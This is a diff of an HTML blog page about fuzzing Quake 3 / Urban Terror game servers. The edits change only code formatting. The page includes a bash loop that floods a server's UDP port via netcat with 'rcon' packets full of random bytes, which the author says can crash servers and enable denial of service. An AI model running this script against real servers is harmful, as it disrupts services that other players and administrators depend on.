@@ -115,7 +115,7 @@
 
 <p>Interestingly enough, I found that the game server can be crashed just by sending data to it.  In addition, the way the Quake 3 network protocol is designed, it is susceptible to very simple Denial of Service attacks.  My experiment started off with a simple bash script that later grew into something larger.  Replacing the fuzz variable with your input source can yield many different results.  Here is what I started out with:</p>
 
-<div class="highlight"><pre><code class="bash"><span class="c">#!/bin/bash</span>
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash</span>
  
 <span class="nv">host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span>
 <span class="nv">port</span><span class="o">=</span><span class="s2">&quot;27960&quot;</span>
@@ -125,9 +125,8 @@
 <span class="nv">fuzz</span><span class="o">=</span><span class="sb">`</span>dd <span class="k">if</span><span class="o">=</span>/dev/urandom <span class="nv">bs</span><span class="o">=</span>1K <span class="nv">count</span><span class="o">=</span>1b<span class="sb">`</span>
 
 <span class="k">while</span> :<span class="p">;</span> <span class="k">do</span>
-<span class="k">    </span><span class="nb">echo</span> -e <span class="s2">&quot;\xff\xff\xff\xffrcon $pass $fuzz&quot;</span> <span class="p">|</span> <span class="nv">$nc</span> -q <span class="nv">$timeout</span> -u <span class="nv">$host</span> <span class="nv">$port</span>
-<span class="k">done</span>
-</code></pre></div>
+    <span class="nb">echo</span> -e <span class="s2">&quot;\xff\xff\xff\xffrcon $pass $fuzz&quot;</span> <span class="p">|</span> <span class="nv">$nc</span> -q <span class="nv">$timeout</span> -u <span class="nv">$host</span> <span class="nv">$port</span>
+<span class="k">done</span></code></pre></div>
 
 
 <p>Being that I play this game, I will not be releasing specific results due to the fact that I do not want to be banned from every remaining Urban Terror server on the internet.  I do enjoy the game and do not wish any ill-will on Urban Terror server administrators or the game developers.  It should be interesting how long it takes for the game developers to patch up some of these security holes.  Until then...</p>
